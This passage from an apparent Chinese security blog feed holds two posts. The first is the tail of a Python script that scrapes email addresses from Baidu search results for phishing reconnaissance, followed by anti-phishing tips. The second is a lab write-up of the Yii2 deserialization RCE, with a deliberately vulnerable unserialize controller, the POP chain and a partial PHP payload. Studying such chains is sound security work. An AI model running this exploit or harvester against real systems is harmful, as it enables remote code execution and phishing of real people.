punctuation\">(</span>referer<span class=\"token punctuation\">,</span>headers<span class=\"token operator\">=</span>headers<span class=\"token punctuation\">(</span>referer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre>    r <span class=\"token operator\">=</span> conn<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>baidu_url<span class=\"token punctuation\">,</span> headers<span class=\"token operator\">=</span>headers<span class=\"token punctuation\">(</span>referer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre>    soup <span class=\"token operator\">=</span> BeautifulSoup<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">,</span> <span class=\"token string\">'lxml'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>    tagh3 <span class=\"token operator\">=</span> soup<span class=\"token punctuation\">.</span>find_all<span class=\"token punctuation\">(</span><span class=\"token string\">'h3'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>    <span class=\"token keyword\">for</span> h3 <span class=\"token keyword\">in</span> tagh3<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre>        href <span class=\"token operator\">=</span> h3<span class=\"token punctuation\">.</span>find<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'href'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre>        <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre>            r <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>href<span class=\"token punctuation\">,</span> headers<span class=\"token operator\">=</span>headers<span class=\"token punctuation\">(</span>referer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre>            emails <span class=\"token operator\">=</span> search_email<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre>        <span class=\"token keyword\">except</span> Exception <span class=\"token keyword\">as</span> e<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre>            <span class=\"token keyword\">pass</span></pre></td></tr><tr><td data-num=\"134\"></td><td><pre>        <span class=\"token keyword\">for</span> email <span class=\"token keyword\">in</span> emails<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre>            email_list<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>email<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre>    <span class=\"token keyword\">return</span> email_list</pre></td></tr><tr><td data-num=\"137\"></td><td><pre></pre></td></tr><tr><td data-num=\"138\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">search_email</span><span class=\"token punctuation\">(</span>html<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"139\"></td><td><pre>    emails <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span>findall<span class=\"token punctuation\">(</span><span class=\"token string\">r\"[a-z0-9\\.\\-+_]+@[a-z0-9\\.\\-+_]+\\.[a-z]+\"</span><span class=\"token punctuation\">,</span>html<span class=\"token punctuation\">,</span>re<span class=\"token punctuation\">.</span>I<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"140\"></td><td><pre>    <span class=\"token keyword\">return</span> emails</pre></td></tr><tr><td data-num=\"141\"></td><td><pre></pre></td></tr><tr><td data-num=\"142\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">headers</span><span class=\"token punctuation\">(</span>referer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"143\"></td><td><pre>    headers <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">'User-Agent'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"144\"></td><td><pre>               <span class=\"token string\">'Accept'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'*/*'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"145\"></td><td><pre>               <span class=\"token string\">'Accept-Language'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'en-US,en;q=0.5'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"146\"></td><td><pre>               <span class=\"token string\">'Accept-Encoding'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'gzip,deflate'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"147\"></td><td><pre>               <span class=\"token string\">'Referer'</span><span class=\"token punctuation\">:</span> referer</pre></td></tr><tr><td data-num=\"148\"></td><td><pre>               <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"149\"></td><td><pre>    <span class=\"token keyword\">return</span> headers</pre></td></tr><tr><td data-num=\"150\"></td><td><pre></pre></td></tr><tr><td data-num=\"151\"></td><td><pre></pre></td></tr><tr><td data-num=\"152\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"153\"></td><td><pre>    <span class=\"token comment\">#定义异常</span></pre></td></tr><tr><td data-num=\"154\"></td><td><pre>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"155\"></td><td><pre>        start<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"156\"></td><td><pre>    <span class=\"token keyword\">except</span> KeyboardInterrupt<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"157\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"interrupted by user, killing all threads...\"</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"邮件钓鱼的防御\"><a class=\"anchor\" href=\"#邮件钓鱼的防御\">#</a> 邮件钓鱼的防御</h2>\n<ol>\n<li>尽量避免直接点击邮件中的网络连接以及附件文件；</li>\n<li>回复邮件时，如果回复的地址与发信人不同，要谨慎对待；</li>\n<li>对于要求提供任何关于自己隐私（如：账号名、口令、银行账号等）的邮件，要谨慎对待；</li>\n<li>不要使用很简单的口令；</li>\n<li>尽量不要使用同一个口令，不同的账号，使用不同的口令；</li>\n<li>邮件系统要及时清理；</li>\n<li>公司邮件系统安装部署安全邮件网关</li>\n</ol>\n<p>​</p>\n",
            "tags": [
                "Web",
                "被动信息收集"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2023/03/11/yii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/",
            "url": "https://blog.xcu.icu/2023/03/11/yii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/",
            "title": "yii反序列化",
            "date_published": "2023-03-11T04:00:00.000Z",
            "content_html": "<h2 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h2>\n<p>CTFshow 做到这一块了，先简单的记录一下对 pop 链的构建，然后借助题来练习一下</p>\n<p>文章参考<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueWlpY2hpbmEuY29tL3R1dG9yaWFsLzEyMQ==\"> Yii2.0 路由（Route）的实现原理 - 教程 - Yii Framework 中文网 (yiichina.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU3NjcyNS9hcnRpY2xlL2RldGFpbHMvMTIzOTg2ODE5\">(66 条消息) yii 反序列化漏洞复现及利用_yii 漏洞_拓海 AE 的博客 - CSDN 博客</span></p>\n<h2 id=\"yii框架\"><a class=\"anchor\" href=\"#yii框架\">#</a> yii 框架</h2>\n<p>yii 是一个适用于 web2.0 的应用开发 php 框架<br />\n yii 是一个通用的 web 编程框架，即可以开发各种用 PHP 构建的 web 应用。因为基于组件的框架结构，比较适合大型应用开发，现在主要使用的是 2.0 这个重写的版本，它使用了 php 的命名空间和特质的特性</p>\n<h2 id=\"漏洞描述\"><a class=\"anchor\" href=\"#漏洞描述\">#</a> 漏洞描述</h2>\n<p>yii2.2.0.38 之前的版本存在反序列化漏洞，程序在调用 unserialize 时，我们可以通过构造特定的 payload 来进行 rce</p>\n<h2 id=\"环境搭建\"><a class=\"anchor\" href=\"#环境搭建\">#</a> 环境搭建</h2>\n<p>选择的版本是 2.0.37<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3lpaXNvZnQveWlpMi9yZWxlYXNlcy90YWcvMi4wLjM3\">Release 2.0.37 · yiisoft/yii2 · GitHub</span></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303082128415.png\" alt=\"image-20230308212823338\" /></p>\n<p>在 config/web.php 文件的 cookieValidationKey 为一个值（这个值为一个随机的值就可以了，不然会报错 狗头.jpg）</p>\n<p>在文件中有一个 yii 文件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303091010504.png\" alt=\"image-20230309101038399\" /></p>\n<p>运行这个文件就可以开启这个服务</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303091015862.png\" alt=\"image-20230309101540820\" /></p>\n<p>访问给的这个地址</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303091017019.png\" alt=\"image-20230309101720932\" /></p>\n<p>到此，一个简单的复现环境就搭建好了</p>\n<h2 id=\"漏洞复现2037\"><a class=\"anchor\" href=\"#漏洞复现2037\">#</a> 漏洞复现 2.0.37</h2>\n<p>环境搭建好了就开始构造利用</p>\n<h3 id=\"知识点\"><a class=\"anchor\" href=\"#知识点\">#</a> 知识点</h3>\n<p>这里主要简单记录一下以前写笔记时没有记录到的知识点</p>\n<h4 id=\"命名空间\"><a class=\"anchor\" href=\"#命名空间\">#</a> 命名空间</h4>\n<p>PHP 的命名空间是一种用于解决命名冲突问题的技术。它可以让开发者在同一个程序中使用相同的类名、函数名或常量名，而不会发生命名冲突的问题。</p>\n<p><code>空间成员</code> ：这里空间成员是指空间所影响的（只影响类，函数，常量）</p>\n<p>空间成员的访问：</p>\n<p>一个 php 文件中，第一个空间的定义义必须放在第 1 行。如果所要定义的空间已存在，则是进入空间</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">app</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//app\\test()</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">app<span class=\"token punctuation\">\\</span>assets</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//app\\assets\\test()</span></span></pre></td></tr></table></figure><p>在 PHP 中，命名空间可以通过关键字  <code>namespace</code>  来定义。例如，下面的代码定义了命名空间  <code>MyNamespace</code> ：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">MyNamespace</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">MyClass</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token comment\">// class definition</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>在定义了命名空间之后，我们可以使用完全限定名称（Fully Qualified Name）来访问该命名空间中的类、函数或常量。例如，如果要访问上面定义的  <code>MyClass</code>  类，可以使用以下代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$obj</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name class-name-fully-qualified\"><span class=\"token punctuation\">\\</span>MyNamespace<span class=\"token punctuation\">\\</span>MyClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>在上面的代码中， <code>\\</code>  表示根命名空间，因此  <code>\\MyNamespace\\MyClass</code>  表示完全限定名称。</p>\n<p><code>引入空间成员</code> :</p>\n<p>use 空间名 \\ 空间名 【as 别名】：将指定空间引入到当前空间。同可以使用 as 关键字为被引入的空间起个别名。</p>\n<p>use 空间名 \\ 空间名 \\ 成员类 【as 别名】：将指定的空间中的成员引入到当前空间，引入空间成员只能引入类。</p>\n<h4 id=\"路由\"><a class=\"anchor\" href=\"#路由\">#</a> 路由</h4>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303091043533.png\" alt=\"image-20230309104343460\" /></p>\n<p>这里可以看一下日志，可以看到所有的用户请求都是发送给入口脚本  <code>index.php</code>  来处理的。那么，开发者需要一种高效的判断请求应当采用哪个 controller 哪个 action 进行处理的方法。</p>\n<p>这里并不像是像有些网站那种 https://www.cnblogs.com/LQ-Joker/p/16102371.html 一是过于冗长，二是易出错且难排查，三是日后修改起来容易有遗漏，yii 提供了路由和 URL 管理的组件路由是指 URL 中用于标识用于处理用户请求的 module, controller, action 的部分，一般情况下由  <code>r</code>  查询参数来指定。如 <code>http://www.digpage.com/index.php?r=post/view&amp;id=100</code>  ，表示这个请求将由 PostController 的 actionView 来处理。</p>\n<p>更多的可以膜拜一下上面路由原理教程</p>\n<h3 id=\"复现\"><a class=\"anchor\" href=\"#复现\">#</a> 复现</h3>\n<p>我们利用的是反序列化漏洞，所以我们需要构建一个反序列化的入口</p>\n<p>在 Controllers 下面创建一个 TestController 文件</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">app<span class=\"token punctuation\">\\</span>controllers</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">TestController</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name class-name-fully-qualified\"><span class=\"token punctuation\">\\</span>yii<span class=\"token punctuation\">\\</span>web<span class=\"token punctuation\">\\</span>Controller</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">actionTest</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>漏洞利用点， <code>basic/vendor/yiisoft/yii2/db/BatchQueryResult.php</code>  这个文件下</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token comment\">// make sure cursor is closed</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token function\">reset</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>     * Resets the batch query.</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>     * This method will clean up the existing batch query so that a new batch query can be performed.</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>     */</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">reset</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">_dataReader</span> <span class=\"token operator\">!==</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">_dataReader</span><span class=\"token operator\">-></span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">_dataReader</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">_batch</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">_value</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">_key</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这里有一个__destruct 函数，通过反序列化会自动调用这个函数，跟到下一步 reset ()，这里只有一个 close 可以跟进</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303092047714.png\" alt=\"image-20230309204712681\" /></p>\n<p>这里继续跟进</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303092048710.png\" alt=\"image-20230309204809681\" /></p>\n<p>没有发现可以利用的点，这里可以控制 $this-&gt;_dataReader，使用一个别的类中没有的参数，可以触发 <code>__call</code>  方法来进行利用。__call 函数的当调用一个不存在或者不可调用的方法的时候会自动调用，全局收索一下，那些地方有__call 函数可以利用，在 <code>basic/vendor/fzaninotto/faker/src/Faker/Generator.php</code>  这个文件下</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303092034885.png\" alt=\"image-20230309203444834\" /></p>\n<p>至于为什么选用这个函数，我们再进一步，查看 format 函数</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303092035551.png\" alt=\"image-20230309203513523\" /></p>\n<p>这里有一个回调函数，如果里面的参数可控这里就可以直接利用了</p>\n<figure class=\"highlight perl\"><figcaption data-lang=\"perl\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>call_user_func_array<span class=\"token punctuation\">(</span>callable <span class=\"token variable\">$callback</span><span class=\"token punctuation\">,</span> array <span class=\"token variable\">$param_arr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> mixed </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>callback</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    被调用的回调函数。</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>param_arr</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    要被传入回调函数的数组，这个数组得是索引数组。</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>function a<span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    echo <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\techo <span class=\"token variable\">$c</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span> </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>call_user_func_array<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> array<span class=\"token punctuation\">(</span><span class=\"token string\">\"111\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"222\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token operator\">//</span>输出 <span class=\"token number\">111</span> <span class=\"token number\">222</span></pre></td></tr></table></figure><p>接着跟进 getFormatter 函数</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303092040954.png\" alt=\"image-20230309204059909\" /></p>\n<p>在第一个 if 语句就可以看到，这里对上面回调函数中的第一个参数是可控的，后一个参数这个函数写为空值了</p>\n<p>这里需要一个类，可以命令执行，这里看到师傅们用的是 call_user_func</p>\n<p>这里全局找一下带有 call_user_func 的类，这里找到两个参数可控的类</p>\n<p><code>basic/vendor/yiisoft/yii2/rest/IndexAction.php</code></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303092133955.png\" alt=\"image-20230309213304905\" /></p>\n<p><code>basic/vendor/yiisoft/yii2/rest/CreateAction.php</code></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303092133649.png\" alt=\"image-20230309213342624\" /></p>\n<p>这两个类都可以使用，pop 链还是比较好构造的</p>\n<figure class=\"highlight perl\"><figcaption data-lang=\"perl\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>yii<span class=\"token operator\">\\</span>db<span class=\"token operator\">\\</span>BatchQueryResult<span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span>__destruct<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span>reset<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>↓↓↓</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Fake<span class=\"token operator\">\\</span>Generator<span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span>__call<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span>format<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span>call_user_func_array</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>↓↓↓</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>yii<span class=\"token operator\">\\</span>rest<span class=\"token operator\">\\</span>IndexAction<span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span>run<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span>call_user_func</pre></td></tr></table></figure><p>Payload：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">yii<span class=\"token punctuation\">\\</span>rest</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">IndexAction</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$checkAccess</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"phpinfo\"</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 调用的函数</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$id</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"1\"</span><span class=\"token punctuation\">;</span>\t\t\t<span class=\"token comment\">// 函数中的参数</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">Faker</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">use</span> <span class=\"token package\">yii<span class=\"token punctuation\">\\</span>rest<span class=\"token punctuation\">\\</span>IndexAction</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Generator</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">protected</span> <span class=\"token variable\">$formatters</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token 